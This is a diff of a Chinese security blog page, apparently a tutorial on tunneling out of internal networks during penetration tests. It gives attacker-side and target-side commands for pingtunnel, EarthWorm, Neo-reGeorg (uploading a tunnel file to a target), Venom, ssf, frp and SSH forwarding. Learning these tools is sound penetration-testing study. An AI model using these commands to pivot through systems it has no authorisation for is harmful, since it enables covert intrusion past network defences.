@@ -424,11 +424,14 @@
 <p>tcp、udp、socks5 over ICMP，速度快，连接稳定，跨平台，client模式不需要管理员权限即可正常使用，推荐使用</p>
 </blockquote>
 <p>攻击机上：</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> (可选)关闭系统默认的 ping</span></span><br><span class="line">echo 1 &gt;/proc/sys/net/ipv4/icmp_echo_ignore_all</span><br><span class="line">./pingtunnel -type server -noprint 1 -nolog 1</span><br></pre></td></tr></table></figure>
-
+<pre><code class="shell"># (可选)关闭系统默认的 ping
+echo 1 &gt;/proc/sys/net/ipv4/icmp_echo_ignore_all
+./pingtunnel -type server -noprint 1 -nolog 1</code></pre>
 <p>目标机上：</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 转发TCP</span></span><br><span class="line">pingtunnel.exe -type client -l 127.0.0.1:9999 -s server_ip -t server_ip:7777 -tcp 1 -noprint 1 -nolog 1</span><br><span class="line"><span class="meta">#</span><span class="bash"> 转发sock5</span></span><br><span class="line">pingtunnel.exe -type client -l 127.0.0.1:9999 -s server_ip -tcp 1 -noprint 1 -nolog 1</span><br></pre></td></tr></table></figure>
-
+<pre><code class="shell"># 转发TCP
+pingtunnel.exe -type client -l 127.0.0.1:9999 -s server_ip -t server_ip:7777 -tcp 1 -noprint 1 -nolog 1
+# 转发sock5
+pingtunnel.exe -type client -l 127.0.0.1:9999 -s server_ip -tcp 1 -noprint 1 -nolog 1</code></pre>
 <h2 id="传输层"><a href="#传输层" class="headerlink" title="传输层"></a>传输层</h2><h3 id="netcat"><a href="#netcat" class="headerlink" title="netcat"></a>netcat</h3><blockquote>
 <p><a href="https://eternallybored.org/misc/netcat/" target="_blank" rel="noopener">https://eternallybored.org/misc/netcat/</a></p>
 <p>网络工具中的瑞士军刀，不多介绍，linux系统一般自带</p>
@@ -463,39 +466,33 @@
 </blockquote>
 <p><strong>正向连接</strong></p>
 <p>目标机上：</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ew_for_Win.exe -s ssocksd -l 888</span><br></pre></td></tr></table></figure>
-
+<pre><code class="shell">ew_for_Win.exe -s ssocksd -l 888</code></pre>
 <p><strong>反向连接</strong></p>
 <p>攻击机上：</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./ew_for_linux64 -s rcsocks -l 1080 -e 1234</span><br></pre></td></tr></table></figure>
-
+<pre><code class="shell">./ew_for_linux64 -s rcsocks -l 1080 -e 1234</code></pre>
 <p>目标机上：</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ew_for_Win.exe -s rssocks -d 192.168.44.5 -e 1234</span><br></pre></td></tr></table></figure>
-
+<pre><code class="shell">ew_for_Win.exe -s rssocks -d 192.168.44.5 -e 1234</code></pre>
 <h3 id="Neo-reGeorg"><a href="#Neo-reGeorg" class="headerlink" title="Neo-reGeorg"></a>Neo-reGeorg</h3><blockquote>
 <p><a href="https://github.com/L-codes/Neo-reGeorg" target="_blank" rel="noopener">https://github.com/L-codes/Neo-reGeorg</a></p>
 <p>重构版reGeorg，提高稳定性和可用性，避免特征检测，更新活跃</p>
 </blockquote>
 <p>攻击机上：</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python neoreg.py generate -k 123456</span><br></pre></td></tr></table></figure>
-
+<pre><code class="shell">python neoreg.py generate -k 123456</code></pre>
 <p>上传对应的<code>tunnel.(aspx|ashx|jsp|php)</code>文件到目标机上</p>
 <p>攻击机上：</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 neoreg.py -k 123456 -u http://192.168.33.4/tunnel.php</span><br></pre></td></tr></table></figure>
-
+<pre><code class="shell">python3 neoreg.py -k 123456 -u http://192.168.33.4/tunnel.php</code></pre>
 <h3 id="venom"><a href="#venom" class="headerlink" title="venom"></a>venom</h3><blockquote>
 <p><a href="https://github.com/Dliv3/Venom" target="_blank" rel="noopener">https://github.com/Dliv3/Venom</a></p>
 <p>Venom是一款为渗透测试人员设计的使用Go开发的多级代理工具</p>
 </blockquote>
 <p>攻击机上：</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./admin_linux_x64 -lport 9999</span><br></pre></td></tr></table></figure>
-
+<pre><code class="shell">./admin_linux_x64 -lport 9999</code></pre>
 <p>目标机上：</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">agent.exe -rhost 192.168.44.5 -rport 9999</span><br></pre></td></tr></table></figure>
-
+<pre><code class="shell">agent.exe -rhost 192.168.44.5 -rport 9999</code></pre>
 <p>攻击机上：</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">show</span><br><span class="line">goto 1</span><br><span class="line">socks 6666</span><br></pre></td></tr></table></figure>
-
+<pre><code class="shell">show
+goto 1
+socks 6666</code></pre>
 <h3 id="ssf"><a href="#ssf" class="headerlink" title="ssf"></a>ssf</h3><blockquote>
 <p><a href="https://github.com/securesocketfunneling/ssf" target="_blank" rel="noopener">https://github.com/securesocketfunneling/ssf</a></p>
 <p>支持TLS隧道</p>
@@ -503,34 +500,33 @@
 <p><strong>正向连接</strong></p>
 <p>把certs文件夹和ssfd上传到目标机上</p>
 <p>目标机上：</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssfd.exe ‐p 1333</span><br></pre></td></tr></table></figure>
-
+<pre><code class="shell">ssfd.exe ‐p 1333</code></pre>
 <p>攻击机上：</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./ssfd ‐D 1222 ‐p 1333 192.168.33.4</span><br></pre></td></tr></table></figure>
-
+<pre><code class="shell">./ssfd ‐D 1222 ‐p 1333 192.168.33.4</code></pre>
 <p><strong>反向连接</strong></p>
 <p>攻击机上：</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./ssfd ‐p 1234</span><br></pre></td></tr></table></figure>
-
+<pre><code class="shell">./ssfd ‐p 1234</code></pre>
 <p>目标机上：</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssf.exe ‐F 12345 ‐p 1234 192.168.44.5</span><br></pre></td></tr></table></figure>
-
+<pre><code class="shell">ssf.exe ‐F 12345 ‐p 1234 192.168.44.5</code></pre>
 <h3 id="frp"><a href="#frp" class="headerlink" title="frp"></a>frp</h3><blockquote>
 <p><a href="https://github.com/fatedier/frp" target="_blank" rel="noopener">https://github.com/fatedier/frp</a></p>
 <p>支持 TCP、UDP、HTTP、HTTPS 等多种协议</p>
 </blockquote>
 <p>攻击机上配置frps.ini</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[common]</span><br><span class="line">bind_port = 6666</span><br></pre></td></tr></table></figure>
-
+<pre><code class="shell">[common]
+bind_port = 6666</code></pre>
 <p>攻击机上：</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./frps -c frps.ini</span><br></pre></td></tr></table></figure>
-
+<pre><code class="shell">./frps -c frps.ini</code></pre>
 <p>目标及配置frpc.ini</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[common]</span><br><span class="line">server_addr = 192.168.33.4</span><br><span class="line">server_port = 6666</span><br><span class="line">[http_proxy]</span><br><span class="line">type=tcp</span><br><span class="line">remote_port=7777</span><br><span class="line">plugin=socks5</span><br></pre></td></tr></table></figure>
-
+<pre><code class="shell">[common]
+server_addr = 192.168.33.4
+server_port = 6666
+[http_proxy]
+type=tcp
+remote_port=7777
+plugin=socks5</code></pre>
 <p>目标机上：</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">frpc.exe -c frpc.ini</span><br></pre></td></tr></table></figure>
-
+<pre><code class="shell">frpc.exe -c frpc.ini</code></pre>
 <h3 id="nps"><a href="#nps" class="headerlink" title="nps"></a>nps</h3><blockquote>
 <p><a href="https://github.com/ehang-io/nps" target="_blank" rel="noopener">https://github.com/ehang-io/nps</a></p>
 <p>可支持任何tcp、udp上层协议，还支持内网http代理、内网socks5代理、p2p等，并带有功能强大的web管理端</p>
@@ -584,25 +580,38 @@
 </blockquote>
 <p>本地端口转发：</p>
 <blockquote>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;</span><span class="bash"> -L 本地网卡地址:本地端口:目标地址:目标端口</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash"></span></span><br></pre></td></tr></table></figure>
+<pre><code class="shell">-L 本地网卡地址:本地端口:目标地址:目标端口</code></pre>
 </blockquote>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ssh -CNfg -L 127.0.0.1:7777:114.114.114.114:9999 root@192.168.1.1</span><br><span class="line"><span class="meta">#</span><span class="bash"> 或者省略本地网卡地址</span></span><br><span class="line">ssh -CNfg -L 7777:114.114.114.114:9999 root@192.168.1.1</span><br><span class="line"><span class="meta">#</span><span class="bash"> ssh客户端监听127.0.0.1:7777, 将收到的tcp数据包通过连接到192.168.1.1的ssh隧道转发到ssh服务端，再由ssh服务端转发到114.114.114.114:9999</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 即本地机器的127.0.0.1:7777可以通过192.168.1.1的ssh隧道访问远程的114.114.114.114:9999</span></span><br></pre></td></tr></table></figure>
-
+<pre><code class="shell">ssh -CNfg -L 127.0.0.1:7777:114.114.114.114:9999 root@192.168.1.1
+# 或者省略本地网卡地址
+ssh -CNfg -L 7777:114.114.114.114:9999 root@192.168.1.1
+# ssh客户端监听127.0.0.1:7777, 将收到的tcp数据包通过连接到192.168.1.1的ssh隧道转发到ssh服务端，再由ssh服务端转发到114.114.114.114:9999
+# 即本地机器的127.0.0.1:7777可以通过192.168.1.1的ssh隧道访问远程的114.114.114.114:9999</code></pre>
 <p>远程端口转发：</p>
 <blockquote>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;</span><span class="bash"> -R 远程网卡地址:远程端口:目标地址:目标端口</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash"></span></span><br></pre></td></tr></table></figure>
+<pre><code class="shell">-R 远程网卡地址:远程端口:目标地址:目标端口</code></pre>
 </blockquote>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ssh -CNfg -R 127.0.0.1:7777:114.114.114.114:9999 root@192.168.1.1</span><br><span class="line"><span class="meta">#</span><span class="bash"> 或者省略远程网卡地址</span></span><br><span class="line">ssh -CNfg -R 7777:114.114.114.114:9999 root@192.168.1.1</span><br><span class="line"><span class="meta">#</span><span class="bash"> ssh服务端监听127.0.0.1:7777, 将收到的tcp数据包通过连接到192.168.1.1的ssh隧道转发到ssh客户端，再由ssh客户端转发到114.114.114.114:9999</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 即远程机器的127.0.0.1:7777可以通过192.168.1.1的ssh隧道访问本地的114.114.114.114:9999</span></span><br></pre></td></tr></table></figure>
-
+<pre><code class="shell">ssh -CNfg -R 127.0.0.1:7777:114.114.114.114:9999 root@192.168.1.1
+# 或者省略远程网卡地址
+ssh -CNfg -R 7777:114.114.114.114:9999 root@192.168.1.1
+# ssh服务端监听127.0.0.1:7777, 将收到的tcp数据包通过连接到192.168.1.1的ssh隧道转发到ssh客户端，再由ssh客户端转发到114.114.114.114:9999
+# 即远程机器的127.0.0.1:7777可以通过192.168.1.1的ssh隧道访问本地的114.114.114.114:9999</code></pre>
 <p>动态端口转发：</p>
 <blockquote>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;</span><span class="bash"> -D 本地网卡地址:本地端口</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash"></span></span><br></pre></td></tr></table></figure>
+<pre><code class="shell">-D 本地网卡地址:本地端口</code></pre>
 </blockquote>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ssh -CNfg -D 127.0.0.1:7777 root@192.168.1.1</span><br><span class="line"><span class="meta">#</span><span class="bash"> ssh客户端监听127.0.0.1:7777开启socks服务，将收到的socks数据包通过连接到192.168.1.1的ssh隧道转发到ssh服务端，再由ssh服务端转发到目标地址</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 即远程机器在设置127.0.0.1:7777的socks5代理后可以通过192.168.1.1的ssh隧道访问本地服务</span></span><br></pre></td></tr></table></figure>
-
+<pre><code class="shell">ssh -CNfg -D 127.0.0.1:7777 root@192.168.1.1
+# ssh客户端监听127.0.0.1:7777开启socks服务，将收到的socks数据包通过连接到192.168.1.1的ssh隧道转发到ssh服务端，再由ssh服务端转发到目标地址
+# 即远程机器在设置127.0.0.1:7777的socks5代理后可以通过192.168.1.1的ssh隧道访问本地服务</code></pre>
 <p>构建ssh隧道的常用参数:</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">-C 压缩传输，提高传输速度</span><br><span class="line">-f 后台执行数据传输</span><br><span class="line">-N 建立静默连接</span><br><span class="line">-g 允许远程主机连接本地用于转发的端口</span><br><span class="line">-L 本地端口转发</span><br><span class="line">-R 远程端口转发</span><br><span class="line">-D 动态转发，即SOCKS代理</span><br><span class="line">-p 指定ssh连接端口</span><br></pre></td></tr></table></figure>
-
+<pre><code class="shell">-C 压缩传输，提高传输速度
+-f 后台执行数据传输
+-N 建立静默连接
+-g 允许远程主机连接本地用于转发的端口
+-L 本地端口转发
+-R 远程端口转发
+-D 动态转发，即SOCKS代理
+-p 指定ssh连接端口</code></pre>
 <h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://xz.aliyun.com/t/9454" target="_blank" rel="noopener">内网穿透的n种姿势</a></p>
 <p><a href="https://xz.aliyun.com/t/7701" target="_blank" rel="noopener">内网渗透之内网穿透</a></p>
 
@@ -653,6 +662,10 @@
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2021/05/25/FastJson反序列化漏洞研究/" rel="prev" title="Fastjson反序列化漏洞研究">
+                Fastjson反序列化漏洞研究 <i class="fa fa-chevron-right"></i>
+              </a>
             
           </div>
         </div>
@@ -731,7 +744,7 @@
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">29</span>
+                  <span class="site-state-item-count">30</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
@@ -744,7 +757,7 @@
               
               <div class="site-state-item site-state-tags">
                 <a href="/tags/index.html">
-                  <span class="site-state-item-count">10</span>
+                  <span class="site-state-item-count">11</span>
                   <span class="site-state-item-name">标签</span>
                 </a>
               </div>
@@ -835,6 +848,17 @@
   <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Mist</a> v5.1.4</div>
 -->
 
+
+
+
+
+<!-- Highlight.js -->
+<link rel="stylesheet" href="//cdn.bootcss.com/highlight.js/9.2.0/styles/github.min.css">
+<script src="//cdn.bootcss.com/highlight.js/9.2.0/highlight.min.js">
+</script>
+<script>
+    hljs.initHighlightingOnLoad();
+</script>
 
 
         
